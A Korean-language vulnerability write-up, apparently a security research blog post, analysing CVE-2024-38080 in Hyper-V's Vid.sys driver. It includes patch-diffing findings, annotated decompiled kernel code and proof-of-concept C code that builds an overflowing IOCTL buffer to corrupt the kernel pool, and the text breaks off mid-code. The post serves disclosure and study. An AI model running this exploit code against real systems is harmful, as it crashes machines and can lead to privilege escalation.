title="CVE-2024-38080"></a>CVE-2024-38080</h1><ul><li>Impact: Elevation of Privilege</li><li>Max Severity: Important</li><li>Weakness: CWE-190(Integer Overflow or Wraparound)</li><li>poc: <a href="https://github.com/pwndorei/CVE-2024-38080">https://github.com/pwndorei/CVE-2024-38080</a></li></ul><h2 id="Affected-Product-amp-Version-Infomation"><a href="#Affected-Product-amp-Version-Infomation" class="headerlink" title="Affected Product &amp; Version Infomation"></a>Affected Product &amp; Version Infomation</h2><ul><li>Windows 11 21H2<ul><li>&lt; 10.0.22000.3079</li></ul></li><li>Windows 11 22H2<ul><li>&lt; 10.0.22621.3880</li></ul></li><li>Windows 11 23H2<ul><li>&lt; 10.0.22631.3880</li></ul></li><li>&#x2026;</li></ul><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>CVE-2024-38080&#xC740; Hyper-V&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; EoP &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB97C; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD560; &#xACBD;&#xC6B0; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC744; &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; &#xC774;&#xBBF8; &#xC545;&#xC6A9; &#xC0AC;&#xB840;&#xAC00; &#xBCF4;&#xACE0;&#xB418;&#xC5B4; CISA&#xC758; Known Exploited Vulnerability Catalog&#xC5D0; &#xB4F1;&#xB85D;&#xB418;&#xAE30;&#xB3C4; &#xD55C; &#xC2EC;&#xAC01;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Patch-Diffing"><a href="#Patch-Diffing" class="headerlink" title="Patch Diffing"></a>Patch Diffing</h2><p>Windows 11 22H2 &#xD658;&#xACBD;&#xC5D0;&#xC11C; 2024&#xB144; 6&#xC6D4;(KB5039212)&#xACFC; CVE-2024-38080&#xC774; &#xD328;&#xCE58;&#xB41C; 2024&#xB144; 7&#xC6D4;(KB5040442)&#xC758; &#xD328;&#xCE58;&#xB85C;&#xBD80;&#xD130;  <a href="https://github.com/pwndorei/Patch-V">Patch-V</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; Hyper-V&#xC640; &#xAD00;&#xB828;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB4E4;&#xC758; &#xD328;&#xCE58;&#xB97C; &#xC9C4;&#xD589;,  SYSTEM &#xAD8C;&#xD55C; &#xD68D;&#xB4DD;&#xC774; &#xAC00;&#xB2A5;&#xD55C; EoP &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;(.sys)&#xC704;&#xC8FC;&#xB85C; &#xBA3C;&#xC800; Diffing&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>patch diffing &#xACB0;&#xACFC;, &#xC544;&#xB798;&#xC758; <code>Vid!VidExoBrokerIoctlReceive</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; Integer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="VidExoBrokerIoctlReceive-Vid-sys-10-0-22621-3672"><a href="#VidExoBrokerIoctlReceive-Vid-sys-10-0-22621-3672" class="headerlink" title="VidExoBrokerIoctlReceive (Vid.sys 10.0.22621.3672)"></a><code>VidExoBrokerIoctlReceive</code> (Vid.sys 10.0.22621.3672)</h2><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VidExoBrokerIoctlReceive</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        __int64 VidExoObj,</span></span><span class="hljs-function"><span class="hljs-params">        struct _LIST_ENTRY *a2,</span></span><span class="hljs-function"><span class="hljs-params">        BrokerIrpDataHeader *Dest,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> OutputLen,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a5)</span></span><span class="hljs-function"></span>{  ...  ReceivedIRP = (_IRP *)VidExoBrokerpFindAndDequeueSendIrpForFileObject(VidExoObj, a2);<span class="hljs-comment">//[1] Sent by VidExoBrokerIoctlSend</span>  v9 = ReceivedIRP;  <span class="hljs-keyword">if</span> ( !ReceivedIRP )  {    ...  }  Source = (BrokerIrpDataHeader *)ReceivedIRP-&gt;AssociatedIrp.SystemBuffer;  <span class="hljs-keyword">if</span> ( OutputLen &lt; <span class="hljs-number">0x10</span> )  {    VidExoBrokerpQueueSendIrp(VidExoObj, (__int64)ReceivedIRP);    v10 = <span class="hljs-number">-1073741306</span>;    VidTraceErrorInternal0(<span class="hljs-string">&quot;VidExoBrokerIoctlReceive&quot;</span>, <span class="hljs-string">&quot;onecore\\vm\\vid\\sys\\driver\\videxobroker.c&quot;</span>, <span class="hljs-number">198</span>);    <span class="hljs-keyword">goto</span> LABEL_16;  }  Dest-&gt;HeaderSize = <span class="hljs-number">16</span>;  Dest-&gt;NumHandles = Source-&gt;NumHandles;  v12 = <span class="hljs-number">8</span> * Source-&gt;NumHandles + <span class="hljs-number">16</span>;<span class="hljs-comment">//[2] Integer Overflow</span>  Dest-&gt;DataOffset = v12;  Dest-&gt;DataLen = Source-&gt;DataLen;  v13 = Source-&gt;DataLen + v12;<span class="hljs-comment">//[3] Integer Overflow</span>  <span class="hljs-keyword">if</span> ( OutputLen &lt; v13 )<span class="hljs-comment">//[4] Bypass length check</span>  {    ...  }  RequestorProcess = IoGetRequestorProcess(ReceivedIRP);  v26 = RequestorProcess;  CurrentProcess = PsGetCurrentProcess(v16, v15, v17, v18);  v27 = CurrentProcess;  TargetHandle = (HANDLE *)((<span class="hljs-keyword">char</span> *)Dest + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Dest-&gt;HeaderSize);  SourceHandle = (HANDLE *)((<span class="hljs-keyword">char</span> *)Source + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Source-&gt;HeaderSize);  v25 = SourceHandle;  Idx = <span class="hljs-number">0</span>i64;  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  {    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Idx &gt;= Source-&gt;NumHandles )    {      memmove(        (<span class="hljs-keyword">char</span> *)Dest + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Dest-&gt;DataOffset,        (<span class="hljs-keyword">char</span> *)Source + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Source-&gt;DataOffset,        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Source-&gt;DataLen);<span class="hljs-comment">//[5] Non paged pool BOF</span>      v10 = <span class="hljs-number">0</span>;      *a5 = v13;      <span class="hljs-keyword">goto</span> LABEL_15;    }    LOBYTE(v24) = <span class="hljs-number">1</span>;    v10 = ObDuplicateObject(RequestorProcess, SourceHandle[Idx], CurrentProcess, &amp;TargetHandle[Idx], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, v24);<span class="hljs-comment">//[6] Non paged pool OOB Write</span>    <span class="hljs-keyword">if</span> ( v10 &lt; <span class="hljs-number">0</span> )      <span class="hljs-keyword">break</span>;    SourceHandle = v25;    Idx = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(Idx + <span class="hljs-number">1</span>);    RequestorProcess = v26;    CurrentProcess = v27;  }  <span class="hljs-keyword">while</span> ( (_DWORD)Idx )  {    LODWORD(Idx) = Idx - <span class="hljs-number">1</span>;    ZwClose(TargetHandle[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Idx]);  }  VidTraceErrorInternal0(<span class="hljs-string">&quot;VidExoBrokerIoctlReceive&quot;</span>, <span class="hljs-string">&quot;onecore\\vm\\vid\\sys\\driver\\videxobroker.c&quot;</span>, <span class="hljs-number">261</span>);LABEL_15:  v9-&gt;IoStatus.Status = v10;  IofCompleteRequest(v9, <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> ( v10 &lt; <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> LABEL_16;  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v10;}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC774;&#xB984;&#xCC98;&#xB7FC; Ioctl&#xC744; Receive&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; [1]&#xC744; &#xBCF4;&#xBA74; <code>VidExoBrokerpFindAndDequeueSendIrpForFileObject</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; IRP(I/O Request Packet)&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xAC00;&#xC838;&#xC624;&#xB294; IRP&#xB294; <code>VidExoBrokerIoctlSend</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xBCF4;&#xB0B4;&#xC9C4; IRP&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774;&#xD6C4; &#xCC38;&#xC870;&#xB418;&#xB294; <code>ReceivedIRP-&gt;AssociatedIrp.SystemBuffer</code>&#xC5D0;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD568;&#xC218;&#xC758; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xB3D9;&#xC791;&#xC744; &#xB9AC;&#xBC84;&#xC2F1;&#xD574;&#xBCF8; &#xACB0;&#xACFC; <code>VidExoBrokerIoctlSend</code>&#xB85C; &#xBCF4;&#xB0B4;&#xC9C4; IRP(&#xC704; &#xCF54;&#xB4DC;&#xC758; <code>ReceivedIRP</code>)&#xC758; <code>SystemBuffer</code>(<code>Source</code>)&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; <code>VidExoBrokerIoctlReceive</code>&#xC758; <code>IRP-&gt;AssociatedIrp.SystemBuffer</code>(<code>Dest</code>)&#xB85C; &#xBCF5;&#xC0AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0; <code>SystemBuffer</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xCD94;&#xCE21;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BrokerIrpDataHeader</span>{</span>DWORD HeaderSize;<span class="hljs-comment">//0x10</span>DWORD NumHandles;DWORD DataOffset;DWORD DataLen;}</code></pre><pre><code class="hljs c">Low |----------|----------|----------|----------|---------- ... ----------|---------- ... ----------| High     HeaderSize NumHandles DataOffset DataLen    `NumHandles` sized        `DataLen` bytes of Data                                                 HANDLE Array</code></pre><p>&#xB370;&#xC774;&#xD130;&#xC758; &#xB9E8; &#xC55E;&#xBD80;&#xBD84;&#xC5D0;&#xB294; 0x10 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xD5E4;&#xB354;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xD5E4;&#xB354;&#xC758; &#xB4B7;&#xBD80;&#xBD84;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;, &#xC624;&#xD504;&#xC14B; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>HeaderSize</code>: &#xD56D;&#xC0C1; 0x10</li><li><code>NumHandles</code>: &#xD5E4;&#xB354; &#xB4B7; &#xBD80;&#xBD84;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>HANDLE</code> &#xBC30;&#xC5F4;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>HANDLE</code>&#xC758; &#xC218;</li><li><code>DataOffset</code>: <code>HANDLE</code> &#xBC30;&#xC5F4;&#xC774; &#xB05D;&#xB098;&#xACE0; Data&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xAC12;</li><li><code>DataLen</code>: &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;</li></ul><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD5E4;&#xB354;&#xC758; &#xD544;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xC758; &#xCD1D; &#xAE38;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; [2]&#xC5D0;&#xC11C;&#xB294; <code>Source</code>&#xC758; <code>NumHandles * 8</code>&#xC5D0; + 0x10(<code>HeaderSize</code>)&#xB97C; &#xD558;&#xBA74;&#xC11C; &#xD5E4;&#xB354;&#xBD80;&#xD130; <code>HANDLE</code> &#xBC30;&#xC5F4;&#xAE4C;&#xC9C0;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xACC4;&#xC0B0;&#xD574;&#xC11C; <code>v12</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>NumHandle</code>&#xC758; &#xAC12;&#xC774; 0x1ffffffe &#xC774;&#xC0C1;&#xC774;&#xB77C;&#xBA74; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; [3]&#xC5D0;&#xC11C;&#xB294; [2]&#xB85C; &#xACC4;&#xC0B0;&#xB41C; &#xAC12;&#xC5D0; <code>DataLen</code>&#xC744; &#xB354;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774;&#xB54C;&#xB3C4; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Integer Overflow&#xC758; &#xACB0;&#xACFC;, <code>Source</code>&#xC758; &#xCD1D; &#xAE38;&#xC774;(<code>v13</code>)&#xC774; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xAC12;&#xC774; &#xB418;&#xACE0; <code>Dest</code>&#xC758; &#xD06C;&#xAE30;&#xC778; <code>OutputLen</code>&#xBCF4;&#xB2E4; &#xC791;&#xC544;&#xC9C0;&#xAC8C; &#xB418;&#xBA74;&#xC11C; <code>Source</code>&#xC758; &#xD06C;&#xAE30;&#xAC00; <code>Dest</code>&#xC758; &#xD06C;&#xAE30;(<code>OutputLen</code>)&#xBCF4;&#xB2E4; &#xD06C;&#xC9C0; &#xC54A;&#xC740;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; if&#xBB38;&#xC744; &#xD1B5;&#xACFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD070; <code>Source</code>&#xC758; <code>DataLen</code>&#xACFC; <code>NumHandles</code>&#xC5D0; &#xC758;&#xD574; &#xAC01;&#xAC01; [5]&#xC758; <code>memmove</code>&#xC5D0;&#xC11C; buffer overflow&#xB97C;, [6]&#xC758; <code>ObDuplicateObject</code>&#xC5D0;&#xC11C; OOB Write&#xB97C; &#xC720;&#xBC1C;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof-of-Concept"></a>Proof-of-Concept</h1><p>poc &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>VidExoBrokerIoctlSend</code>&#xC640; <code>VidExoBrokerIoctlReceive</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xACE0; &#xCEE4;&#xB110;&#xC758; Non paged pool&#xC5D0;&#xC11C; &#xB300;&#xB7C9;&#xC758; overflow&#xB97C; &#xC77C;&#xC73C;&#xCF1C; BSOD&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xBAA8;&#xB450; Hyper-V&#xC758; Vid(Virtualization Infrastructure Driver)&#xC758; Exo Partition &#xAD00;&#xB9AC; &#xAE30;&#xB2A5;&#xACFC; &#xC5F0;&#xAD00;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; <code>\Device\VidExo</code> &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xD578;&#xB4E4;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>DeviceIoControl</code>&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. \Device\VIdExo&#xC758; Ioctl Handler&#xB97C; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xAC01; &#xD568;&#xC218;&#xC758; IoControlCode&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VidExoIoControlPartition</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        struct _KDPC *VidExoObj,</span></span><span class="hljs-function"><span class="hljs-params">        _IRP *irp,</span></span><span class="hljs-function"><span class="hljs-params">        struct _LIST_ENTRY *FileObj,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *InputBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> InputLen,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> **OutputBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> OutputLen,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> IoControlCode,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a9)</span></span><span class="hljs-function"></span>{  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// ecx</span>  *a9 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( IoControlCode &gt; <span class="hljs-number">0x221198</span> )  {    <span class="hljs-keyword">switch</span> ( IoControlCode )    {      ...      <span class="hljs-keyword">case</span> <span class="hljs-number">0x221288</span>u:        <span class="hljs-keyword">if</span> ( InputLen &lt; <span class="hljs-number">0x10</span> )          <span class="hljs-keyword">goto</span> LABEL_25;        result = VidExoBrokerIoctlSend((__int64)VidExoObj, irp, (BrokerIrpDataHeader *)InputBuffer, InputLen);        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> <span class="hljs-number">0x22128C</span>u:        <span class="hljs-keyword">if</span> ( OutputLen &lt; <span class="hljs-number">0x10</span> )LABEL_25:          result = <span class="hljs-number">0xC000000D</span>i64;        <span class="hljs-keyword">else</span>          result = VidExoBrokerIoctlReceive(                     (__int64)VidExoObj,                     FileObj,                     (BrokerIrpDataHeader *)OutputBuffer,                     OutputLen,                     a9);        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">goto</span> LABEL_6;    }  }  ...  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC544;&#xB798;&#xB294; WHVP(Windows Hypervisor Platform) API&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; <code>\Device\VidExo</code> &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC758; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">WHV_PARTITION_HANDLE prtn;WHV_CAPABILITY cap;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> size, val;WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &amp;cap, <span class="hljs-keyword">sizeof</span>(cap), &amp;size);<span class="hljs-keyword">if</span> (cap.HypervisorPresent == <span class="hljs-number">0</span>){<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hypervisor is not present\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}WHvCreatePartition(&amp;prtn);val = <span class="hljs-number">1</span>;<span class="hljs-comment">//processor cnt</span>WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &amp;val, <span class="hljs-keyword">sizeof</span>(val));WHvSetupPartition(prtn);VidExo = (HANDLE)(*((__int64*)prtn + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xfffffffffffffffe</span>);<span class="hljs-comment">//obtain HANDLE of \Device\VidExo</span></code></pre><p>Exo Partition&#xACFC; VidExo&#xC5D0; &#xB300;&#xD55C; &#xB354; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xC774;&#xC804;&#xC5D0; &#xB2E4;&#xB8EC; <a href="https://hackyboiz.github.io/2024/05/12/pwndorei/newjeans-hyper-v-pt7/#Vid-VidExoIoControlPartition">CVE-2023-36407&#xC758; &#xBD84;&#xC11D;</a>&#xC744; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC2DC;&#xAE30; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>VidExoBrokerIoctlSend</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">DWORD NumHandles, DataLen;DataLen = <span class="hljs-number">0xfffff000</span>;<span class="hljs-comment">//[1]</span>NumHandles = (<span class="hljs-number">0x100000000</span> - <span class="hljs-number">0x10</span> - DataLen) / <span class="hljs-keyword">sizeof</span>(HANDLE);DWORD64* payload = VirtualAlloc(<span class="hljs-comment">//[2]</span><span class="hljs-literal">NULL</span>,INPUT_LEN,<span class="hljs-comment">//0xfffff000</span>MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);<span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">NULL</span>) {<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAlloc Failed(%x)\n&quot;</span>, GetLastError());WHvDeletePartition(prtn);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}BrokerIrpDataHeader* hdr = payload;HANDLE proc = GetCurrentProcess();PHANDLE p = &amp;hdr[<span class="hljs-number">1</span>];hdr-&gt;HeaderSize = <span class="hljs-number">0x10</span>;<span class="hljs-comment">//[3]</span>hdr-&gt;NumHandles = NumHandles;hdr-&gt;DataLen = DataLen;hdr-&gt;DataOffset = <span class="hljs-number">0x0</span>;<span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; NumHandles; i++) {*p = proc;p++;}CreateThread(<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,Receive,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (!DeviceIoControl(VidExo, SEND_IOCTL, payload, INPUT_LEN, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) {<span class="hljs-comment">//[5]</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DeviceIoControl(SEND_IOCTL) Failed(%x)\n&quot;</span>, GetLastError());<span class="hljs-keyword">goto</span> CLEAN;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; <code>DataLen</code>&#xC744; 0xfffff000&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB3C4;&#xB85D; &#xACC4;&#xC0B0;&#xB41C; &#xAC12;&#xC73C;&#xB85C; <code>NumHandles</code>&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;([1]). &#xC774;&#xD6C4; <code>VidExoBrokerIoctlSend</code>&#xC758; &#xC778;&#xD48B;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xBC84;&#xD37C;&#xB97C; <code>VirtualAlloc</code>&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;([2]).</p><p>&#xC815;&#xD574;&#xC9C4; &#xAC12;&#xB4E4;&#xB85C; &#xD5E4;&#xB354;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; <code>NumHandles</code> &#xB9CC;&#xD07C;&#xC758; &#xD578;&#xB4E4; &#xBC30;&#xC5F4;&#xC744; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD578;&#xB4E4;(<code>proc</code>)&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;([3]). &#xC774;&#xB294; <code>VidExoBrokerIoctlReceive</code>&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xD578;&#xB4E4;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC81C;&#xB41C; &#xB2E4;&#xC74C;&#xC5D0; <code>memmove</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBC18;&#xB4DC;&#xC2DC; &#xC720;&#xD6A8;&#xD55C; &#xD578;&#xB4E4;&#xC774;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; [5]&#xC5D0;&#xC11C; <code>DeviceIoControl</code>&#xC744; &#xD638;&#xCD9C;&#xD574;&#xC11C; <code>VidExoBrokerIoctlSend</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;&#xC758; <code>DeviceIoControl</code> &#xD638;&#xCD9C;&#xC740; <code>VidExoBrokerIoctlSend</code>&#xB85C; &#xBCF4;&#xB0B4;&#xC9C4; IRP&#xAC00; <code>VidExoBrokerIoctlReceive</code>&#xB85C; &#xC218;&#xC2E0;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xBC18;&#xD658;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; [4]&#xC5D0;&#xC11C; <code>CreateThread</code>&#xB85C; <code>VidExoBrokerIoctlReceive</code>&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC0C8;&#xB85C;&#xC6B4; &#xC2A4;&#xB808;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC0DD;&#xC131;&#xB41C; &#xC2A4;&#xB808;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>Receive</code> &#xD568;&#xC218;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">Receive</span><span class="hljs-params">()</span> </span>{<span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x20</span>];Sleep(<span 